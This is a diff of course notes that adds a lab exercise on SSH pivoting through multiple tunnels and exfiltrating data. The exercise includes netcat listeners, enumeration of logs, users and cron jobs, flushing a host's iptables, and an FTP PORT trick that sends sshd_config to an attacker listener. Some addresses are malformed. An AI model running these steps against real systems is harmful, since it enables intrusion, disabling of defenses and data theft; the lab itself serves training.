@@ -363,7 +363,7 @@ b. Copy to the clipboard by pressing \<CTRL> + C
 * Connection to first redirector and first tunnel:
   * `ssh administrator@192.168.10.4 -L 35261: 192.168.10.7:22`
 * Connection to second redirector and second tunnel via tunnel:
-  * ` 	ssh root@127.0.0.1 -p 35261 -L 16242: 192.168.1e.6:80`
+  * `ssh root@127.0.0.1 -p 35261 -L 16242: 192.168.1e.6:80`
 * Connect to target via tunnels:
   * Point web browser at `http://127.0.0.1:16242`
 
@@ -418,6 +418,7 @@ b. Copy to the clipboard by pressing \<CTRL> + C
   * `nc 192.168.10.5 24981`
 
 ### Multiple Hops: Reverse Tunnel
+
 ![Reverse Tunnel Diagram](./Files/CTE-Week4/Images/ReverseTunnel3.png)
 
 ### Additional Tunnels
@@ -431,3 +432,68 @@ b. Copy to the clipboard by pressing \<CTRL> + C
   * Forwarding port
   * `... <CTRL> + <c>`
   * `[root@localhost ~]#`
+
+## Exersise - Module 2, Lesson 7 – Tunneling and Data Exfiltration
+
+### Senario 1
+
+1. Draw a diagram of the tunnels that will be created. Indicate the client connection created by the beacon on the diagram and document the command used to set up the netcat listener that will receive the communications.
+
+![Exersise Diagram](./Files/CTE-Week4/Images/tunnelexersise.png)
+
+2. Set up the netcat listener.  
+  On Win10 - `nc -l -p 6677`  
+3. Set up the tunnel infrastructure.  
+  On Win10 - `ssh root@10.10.1.40 -L 1111:10.10.1.60:22` - to CentOS  
+  On Win10 - `ssh root@127.0.0.1 -p 1111 -L2222:10.10.1.70:22` - to Kali  
+  On Win10 - `ssh nimda@127.0.0.1 -p 2222 -R31330:127.0.0.1:31330`
+4. Conduct a brief survey of the target in question by investigating the following:  
+  a. Important log files at /var/log  
+    `cat /var/log/syslog*`  
+  b. Recent security events  
+    `cat /var/log/ufw*`
+  c. Network configurations  
+    `ifconfig`
+    `/etc/nsswitch.conf`
+  d. Listing network connections  
+    `netstat -nao | grep LISTENING`
+  e. Listing users  
+    `awk -F ':' '{print $1}' /etc/passwd`  
+  f. Look at schedule jobs  
+    `crontab -l`  
+  g. Check DNS settings and the host file  
+    `cat /etc/hosts`
+    `cat /etc/resolv.conf`
+    `cat /etc/hosts.deny`  
+  h. Look at auto-start services  
+    `upstart`
+5. Wait two minutes to receive the communications.
+6. Document the intercepted communication.
+7. Clean up.
+8. Tear down the SSH tunnels in the proper order.
+
+### Senario 2
+
+1. Clear the iptables including the extra chains on the FTP server and set all default tables policy to ACCEPT.  
+  `iptables --list`  
+  `iptables -P INPUT ACCEPT`  
+  `iptables -P OUTPUT ACCEPT`  
+  `iptables -P FORWARD ACCEPT`  
+  `iptables -F`  
+2. Diagram the forward tunnels and the reverse tunnel , then document the commands that will be used to create them.
+3. Indicate where the client connection on the diagram and create the command syntax for the netcat listener that will be set up to receive the FTP communications.  
+  On Win10 `ssh root@10.10.1.40 -L1111:10.10.1.60:22`  
+  On Win10 `ssh root@127.0.0.1 -p 1111 -L2222:10.10.10.70:22`- To Kali  
+  On Win10 `ssh nimda@127.0.0.1 -p 2222 -L3333:10.10.10.1.71:21` - To Ubuntu  
+  On Win 10 `ssh nimda@127.0.0.1 -p 2222 -R54197:127.0.0.1:54197` - Reverse from Ubuntu  
+4. Prepare a netcat listener on the attack machine to receive the file sshd_ config from the FTP server on port 54197.  
+On Win 10 `nc -lvp 54197 > sshd_config`  
+5. Complete the file transfer.
+NOTE: Once you are logged into the FTP server, use the quote \<ftp command> parameter command to inform the server which port is being used by your netcat listener for the transmission, Next, use quote
+\<ftp command> parameter to retrieve the desired file.  
+`ftp open 127.0.0.1 3333`  
+`nimda -> <password> -> ls`  
+`cd /etc/ssh`  
+`quote port 10,10,1,70,211,181`
+`get sshd_config`
+6. Clean up.  
